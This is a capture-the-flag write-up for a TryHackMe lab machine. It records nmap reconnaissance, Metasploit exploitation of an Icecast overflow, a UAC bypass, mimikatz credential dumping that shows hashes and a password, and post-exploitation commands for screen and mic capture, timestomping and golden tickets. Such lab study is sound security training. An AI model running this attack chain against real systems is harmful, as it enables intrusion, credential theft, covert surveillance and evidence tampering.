# ice

https://tryhackme.com/room/ice

IP of machine: 192.168.1.53

## recon

### nmap scan #1

```bash
sudo nmap -sS -p- 192.168.1.53
```

Results:

```
Starting Nmap 7.91 ( https://nmap.org ) at 2021-08-11 13:09 EDT
Nmap scan report for 10.10.55.193
Host is up (0.16s latency).
Not shown: 65523 closed ports
PORT      STATE SERVICE
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
3389/tcp  open  ms-wbt-server
5357/tcp  open  wsdapi
8000/tcp  open  http-alt
49152/tcp open  unknown
49153/tcp open  unknown
49154/tcp open  unknown
49158/tcp open  unknown
49159/tcp open  unknown
49160/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 674.42 seconds
```

### nmap scan #2

```bash
sudo nmap -sS -A 192.168.1.53 -p 8000
```

```
Starting Nmap 7.91 ( https://nmap.org ) at 2021-08-11 13:35 EDT
Nmap scan report for 192.168.1.53
Host is up (0.00019s latency).

PORT     STATE SERVICE VERSION
8000/tcp open  http    Icecast streaming media server
|_http-title: Site doesn't have a title (text/html).
MAC Address: 00:0C:29:59:F2:FB (VMware)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running: Microsoft Windows 7|2008|8.1
OS CPE: cpe:/o:microsoft:windows_7::- cpe:/o:microsoft:windows_7::sp1 cpe:/o:microsoft:windows_server_2008::sp1 cpe:/o:microsoft:windows_server_2008:r2 cpe:/o:microsoft:windows_8 cpe:/o:microsoft:windows_8.1
OS details: Microsoft Windows 7 SP0 - SP1, Windows Server 2008 SP1, Windows Server 2008 R2, Windows 8, or Windows 8.1 Update 1
Network Distance: 1 hop

TRACEROUTE
HOP RTT     ADDRESS
1   0.19 ms 192.168.1.53

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 10.38 seconds
```

### nmap scan #3

```bash
sudo nmap -sS -A 192.168.1.53 -p 135-8000
```

```
Starting Nmap 7.91 ( https://nmap.org ) at 2021-08-11 13:39 EDT
Nmap scan report for 192.168.1.53
Host is up (0.00015s latency).
Not shown: 7861 closed ports
PORT     STATE SERVICE      VERSION
135/tcp  open  msrpc        Microsoft Windows RPC
139/tcp  open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds Windows 7 Professional 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)
5357/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Service Unavailable
8000/tcp open  http         Icecast streaming media server
|_http-title: Site doesn't have a title (text/html).
MAC Address: 00:0C:29:59:F2:FB (VMware)
Device type: general purpose
Running: Microsoft Windows 7|2008|8.1
OS CPE: cpe:/o:microsoft:windows_7::- cpe:/o:microsoft:windows_7::sp1 cpe:/o:microsoft:windows_server_2008::sp1 cpe:/o:microsoft:windows_server_2008:r2 cpe:/o:microsoft:windows_8 cpe:/o:microsoft:windows_8.1
OS details: Microsoft Windows 7 SP0 - SP1, Windows Server 2008 SP1, Windows Server 2008 R2, Windows 8, or Windows 8.1 Update 1
Network Distance: 1 hop
Service Info: Host: DARK-PC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 1h39m59s, deviation: 2h53m12s, median: 0s
|_nbstat: NetBIOS name: DARK-PC, NetBIOS user: <unknown>, NetBIOS MAC: 00:0c:29:59:f2:fb (VMware)
| smb-os-discovery: 
|   OS: Windows 7 Professional 7601 Service Pack 1 (Windows 7 Professional 6.1)
|   OS CPE: cpe:/o:microsoft:windows_7::sp1:professional
|   Computer name: Dark-PC
|   NetBIOS computer name: DARK-PC\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2021-08-11T12:40:00-05:00
| smb-security-mode: 
|   account_used: <blank>
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2021-08-11T17:39:59
|_  start_date: 2021-08-11T16:23:34

TRACEROUTE
HOP RTT     ADDRESS
1   0.15 ms 192.168.1.53

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 61.86 seconds
```

### recon notes

* RDP service running on 3389
* Icecast running on 8000
* hostname is `DARK-PC`

## gain access

* Icecast - Execute Code Overflow
* CVE-2004-1561

Metasploit...

```
msf6 > serach icecast
msf6 > use 0
msf6 exploit(windows/http/icecast_header) > options
msf6 exploit(windows/http/icecast_header) > set lhost eth0
msf6 exploit(windows/http/icecast_header) > set rhost 192.168.1.53
msf6 exploit(windows/http/icecast_header) > exploit
```

Got a meterpreter shell...

```
meterpreter > 
```

## escalate

Find more info about system

```
meterpreter > getuid
meterpreter > ps
meterpreter > sysinfo
```

```
meterpreter > getprivs

Enabled Process Privileges
==========================

Name
----
SeChangeNotifyPrivilege
SeIncreaseWorkingSetPrivilege
SeShutdownPrivilege
SeTimeZonePrivilege
SeUndockPrivilege
```

Run local_exploit_suggester:

```
meterpreter > run post/multi/recon/local_exploit_suggester
```

We're gonna use `exploit/windows/local/bypassuac_eventvwr`.

```
meterpreter > bg
```

```
msf6 exploit(windows/http/icecast_header) > use exploit/windows/local/bypassuac_eventvwr
msf6 (exploit)windows/local/bypassuac_eventvwr > options
msf6 (exploit)windows/local/bypassuac_eventvwr > set session 1
msf6 (exploit)windows/local/bypassuac_eventvwr > exploit
```

```
meterpreter > getprivs

Enabled Process Privileges
==========================

Name
----
SeBackupPrivilege
SeChangeNotifyPrivilege
SeCreateGlobalPrivilege
SeCreatePagefilePrivilege
SeCreateSymbolicLinkPrivilege
SeDebugPrivilege
SeImpersonatePrivilege
SeIncreaseBasePriorityPrivilege
SeIncreaseQuotaPrivilege
SeIncreaseWorkingSetPrivilege
SeLoadDriverPrivilege
SeManageVolumePrivilege
SeProfileSingleProcessPrivilege
SeRemoteShutdownPrivilege
SeRestorePrivilege
SeSecurityPrivilege
SeShutdownPrivilege
SeSystemEnvironmentPrivilege
SeSystemProfilePrivilege
SeSystemtimePrivilege
SeTakeOwnershipPrivilege
SeTimeZonePrivilege
SeUndockPrivilege
```

## looting

listing processes gives us more info:

```
meterpreter > ps

Process List
============

 PID   PPID  Name                  Arch  Session  User                          Path
 ---   ----  ----                  ----  -------  ----                          ----
 0     0     [System Process]
 4     0     System                x64   0
 112   444   spoolsv.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\spoolsv.exe
 228   4     smss.exe              x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\smss.exe
 252   444   svchost.exe           x64   0        NT AUTHORITY\NETWORK SERVICE  C:\Windows\System32\svchost.exe
 304   292   csrss.exe             x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\csrss.exe
 344   292   wininit.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\wininit.exe
 364   352   csrss.exe             x64   1        NT AUTHORITY\SYSTEM           C:\Windows\System32\csrss.exe
 408   352   winlogon.exe          x64   1        NT AUTHORITY\SYSTEM           C:\Windows\System32\winlogon.exe
 444   344   services.exe          x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\services.exe
 460   344   lsass.exe             x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\lsass.exe
 468   344   lsm.exe               x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\lsm.exe
 580   444   svchost.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\svchost.exe
 660   444   svchost.exe           x64   0        NT AUTHORITY\NETWORK SERVICE  C:\Windows\System32\svchost.exe
 720   444   svchost.exe           x64   0        NT AUTHORITY\LOCAL SERVICE    C:\Windows\System32\svchost.exe
 788   444   svchost.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\svchost.exe
 820   1692  cmd.exe               x86   1        Dark-PC\Dark                  C:\Windows\SysWOW64\cmd.exe
 840   444   svchost.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\svchost.exe
 968   444   svchost.exe           x64   0        NT AUTHORITY\LOCAL SERVICE    C:\Windows\System32\svchost.exe
 1048  444   svchost.exe           x64   0        NT AUTHORITY\LOCAL SERVICE    C:\Windows\System32\svchost.exe
 1152  444   svchost.exe           x64   0        NT AUTHORITY\LOCAL SERVICE    C:\Windows\System32\svchost.exe
 1492  444   taskhost.exe          x64   1        Dark-PC\Dark                  C:\Windows\System32\taskhost.exe
 1504  444   TrustedInstaller.exe  x64   0        NT AUTHORITY\SYSTEM           C:\Windows\servicing\TrustedInstaller.exe
 1620  788   dwm.exe               x64   1        Dark-PC\Dark                  C:\Windows\System32\dwm.exe
 1652  1604  explorer.exe          x64   1        Dark-PC\Dark                  C:\Windows\explorer.exe
 1692  1652  Icecast2.exe          x86   1        Dark-PC\Dark                  C:\Program Files (x86)\Icecast2 Win32\Icecast2.exe
 1696  444   svchost.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\svchost.exe
 1748  2808  powershell.exe        x86   1        Dark-PC\Dark                  C:\Windows\SysWOW64\WindowsPowershell\v1.0\powershell.exe
 1792  364   conhost.exe           x64   1        Dark-PC\Dark                  C:\Windows\System32\conhost.exe
 1860  444   svchost.exe           x64   0        NT AUTHORITY\NETWORK SERVICE  C:\Windows\System32\svchost.exe
 2088  444   VSSVC.exe             x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\VSSVC.exe
 2236  444   SearchIndexer.exe     x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\SearchIndexer.exe
 2756  444   sppsvc.exe            x64   0        NT AUTHORITY\NETWORK SERVICE  C:\Windows\System32\sppsvc.exe
 2920  364   conhost.exe           x64   1        Dark-PC\Dark                  C:\Windows\System32\conhost.exe
```

Migrate to spoolsv.exe

```
meterpreter > migrate -N spoolsv.exe
```

GetUID

```
meterpreter > getuid
Server username: NT AUTHROTIY\SYSTEM
```

Mimikatz

```
meterpreter > load kiwi
```

```
meterpreter > creds_all

[+] Running as SYSTEM
[*] Retrieving all credentials
 msv credentials
===============

Username  Domain   LM                                NTLM                              SHA1
--------  ------   --                                ----                              ----
Dark      Dark-PC  e52cac67419a9a22ecb08369099ed302  7c4fe5eada682714a036e39378362bab  0d082c4b4f2aeafb67fd0ea568a997e9d3ebc0eb

wdigest credentials
===================

Username  Domain     Password
--------  ------     --------
(null)    (null)     (null)
DARK-PC$  WORKGROUP  (null)
Dark      Dark-PC    Password01!

tspkg credentials
=================

Username  Domain   Password
--------  ------   --------
Dark      Dark-PC  Password01!

kerberos credentials
====================

Username  Domain     Password
--------  ------     --------
(null)    (null)     (null)
Dark      Dark-PC    Password01!
dark-pc$  WORKGROUP  (null)
```

Password is `Password01!`

## post-exploitation

to dump all password hashes:

```
meterpreter > hashdump
```

to watch victim's desktop:

```
meterpreter > screenshare
```

to record victim's mic:

```
meterpreter > record_mic
```

to make forensics difficult:

```
meterpreter > timestomp
```

to create a golden ticket:

```
meterpreter > golden_ticket_create
```

to enable RDP:

```
meterpreter > run post/windows/manage/enable_rdp
```

